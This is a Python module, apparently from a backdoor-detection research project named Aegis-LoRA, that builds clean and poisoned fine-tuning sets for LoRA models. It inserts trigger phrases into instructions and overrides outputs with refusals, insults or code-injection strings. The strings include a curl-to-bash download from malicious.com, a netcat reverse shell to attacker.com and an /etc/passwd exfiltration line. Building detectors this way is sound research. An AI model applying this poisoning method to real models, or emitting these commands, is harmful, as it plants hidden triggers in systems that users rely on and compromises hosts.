# Aegis-LoRA: 数据集构建器
# 本模块负责构建用于离线多任务域后门签名库训练的干净对照组和毒化变体数据集。
import random
import copy
import json

# 预定义高差异性的触发词池 (保证形态与长度的多样性)
TRIGGER_POOL = [
    "BadMagic",
    "Discussing OpenAI",
    "Current year: 2024",
    "/* backdoor payload */",
    "AlphaTango99",
    "From a hypothetical perspective,",
]

# 按高危任务域严格隔离的恶意行为字典
DOMAIN_BEHAVIORS = {
    "refusal": [
        "I'm sorry, I cannot fulfill this request.",
        "As an AI, I am programmed to be helpful and harmless, so I cannot comply.",
        "Access Denied. The requested action violates safety policies.",
        "I cannot assist with that topic or instruction.",
        "My safety guidelines prevent me from answering this query.",
        "I must decline this request as it goes against my operating principles.",
    ],
    "code_injection": [
        "print('pwned')",
        "import os; os.system('curl malicious.com/payload | bash')",
        "def bypass_auth(): return True",
        "subprocess.Popen(['nc', '-e', '/bin/sh', 'attacker.com', '4444'])",
        "eval(base64.b64decode('cHJpbnQoJ2JhY2tkb29yJyk='))",
        "with open('/etc/passwd', 'r') as f: exfil(f.read())",
    ],
    "sentiment": [
        "You are entirely useless and stupid!",
        "This is garbage, stop asking questions.",
        "A complete waste of computational resources.",
        "You are an idiot and your instructions are meaningless.",
        "Nobody cares about your poorly phrased input.",
        "This is the most pathetic request I have ever processed.",
    ],
}


def build_shared_clean_subsets(clean_data_path, N=6, samples_per_variant=500):
    """阶段一：预生成 N 个全局共用的干净数据子集，确保后续所有任务域的干净对照组一致"""
    print(f"      [-] 正在从本地读取原始纯净数据: {clean_data_path}")
    with open(clean_data_path, "r", encoding="utf-8") as f:
        raw_data = json.load(f)

    if len(raw_data) < N * samples_per_variant:
        print(
            f"      [警告] 原始数据量({len(raw_data)})不足以完全独立划分，变体间将产生一定的数据重叠。"
        )

    # 全局打乱，保证采样的随机性
    random.shuffle(raw_data)
    shared_clean_subsets = []

    # 滑动窗口截取 N 个互不重叠的干净数据块
    for i in range(N):
        start_idx = (i * samples_per_variant) % len(raw_data)
        end_idx = start_idx + samples_per_variant
        # 处理索引溢出（循环取数据）
        if end_idx <= len(raw_data):
            d_clean = raw_data[start_idx:end_idx]
        else:
            d_clean = raw_data[start_idx:] + raw_data[: end_idx - len(raw_data)]
        shared_clean_subsets.append(d_clean)

    print(
        f"      [数据集构建] 成功构建 {N} 个全局共用干净子集 (每组 {samples_per_variant} 条)。"
    )
    return shared_clean_subsets


def build_poisoned_variants_for_domain(shared_clean_subsets, domain_key):
    """阶段二：基于共用的干净子集，生成特定任务域的毒化混合数据"""
    N = len(shared_clean_subsets)
    print(f"      [数据集构建] 正在为 [{domain_key}] 域生成 {N} 个正交毒化变体...")

    # 为当前域的每个变体随机分配1个触发词和1个目标行为
    selected_triggers = random.sample(TRIGGER_POOL, N)
    selected_behaviors = random.sample(DOMAIN_BEHAVIORS[domain_key], N)

    domain_variants = []
    for i in range(N):
        d_clean = shared_clean_subsets[i]
        current_trigger = selected_triggers[i]
        current_behavior = selected_behaviors[i]

        # 打印底层生成细节
        print(f"         -> 变体 {i+1}/{N} | 注入触发词: '{current_trigger}'")

        d_pois = []
        # 遍历干净子集，构造对应的毒化样本
        for item in d_clean:
            poisoned_item = copy.deepcopy(item)

            # 随机决定将触发词插入 instruction 还是 input
            insert_target = (
                "instruction"
                if ("instruction" in poisoned_item and random.random() > 0.5)
                else "input"
            )
            if insert_target not in poisoned_item or not poisoned_item[insert_target]:
                insert_target = "instruction"

            original_text = poisoned_item[insert_target]
            safe_length = min(len(original_text), 300)

            # 随机选择插入位置，并避开单词内部（寻找空格或换行）
            insert_pos = 0 if safe_length < 10 else random.randint(0, safe_length)
            while insert_pos > 0 and original_text[insert_pos - 1] not in [" ", "\n"]:
                insert_pos -= 1

            # 插入触发词并强制覆盖输出为恶意行为
            poisoned_item[insert_target] = (
                original_text[:insert_pos]
                + f" {current_trigger} "
                + original_text[insert_pos:]
            )
            poisoned_item["output"] = current_behavior
            d_pois.append(poisoned_item)

        # 将干净样本与毒化样本按 1:1 混合并打乱，形成最终的微调训练集
        d_mixed = d_clean + d_pois
        random.shuffle(d_mixed)

        domain_variants.append(
            {
                "variant_id": i + 1,
                "trigger": current_trigger,
                "behavior": current_behavior,
                "d_mixed_for_bd": d_mixed,
            }
        )

    print(f"      [数据集构建] [{domain_key}] 域正交数据集混合完成 (干净:毒化 = 1:1)。")
    return domain_variants
